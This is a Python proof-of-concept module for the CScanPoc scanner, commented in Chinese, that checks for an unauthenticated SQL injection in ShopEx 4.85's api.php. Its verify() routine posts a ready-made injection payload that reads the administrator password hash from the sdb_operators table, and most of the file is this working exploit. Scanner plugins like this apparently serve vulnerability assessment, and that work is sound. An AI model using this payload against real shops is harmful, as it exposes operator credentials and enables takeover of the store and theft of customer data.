# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ShopEx_0022_p'  # 平台漏洞编号，留空
    name = 'ShopEx4.85最新版本SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-07-29'  # 漏洞公布时间
    desc = '''
        Shopex是国内市场占有率最高的网店软件。网上商店平台软件系统又称网店管理系统、网店程序、网上购物系统、在线购物系统。
        ShopEx4.85最新版本SQL注入，无需登录，过GPC，可直接查询管理员密码并回显。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/730/'  # 漏洞来源https://bugs.shuimugan.com/bug/view?bug_no=32753
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopEx'  # 漏洞应用名称
    product_version = 'ShopEx4.85'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '40eeddbb-7a02-4a0a-ab7f-3543f19816bf'  # 平台 POC 编号，留空
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据实际环境确定payload
            payload = "/shopex4.85/api.php?act=search_dly_type&api_version=1.0"
            data = '1,2,(SELECT concat(md5(c),0x7c,userpass) FROM sdb_operators limit 0,1) as name'
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
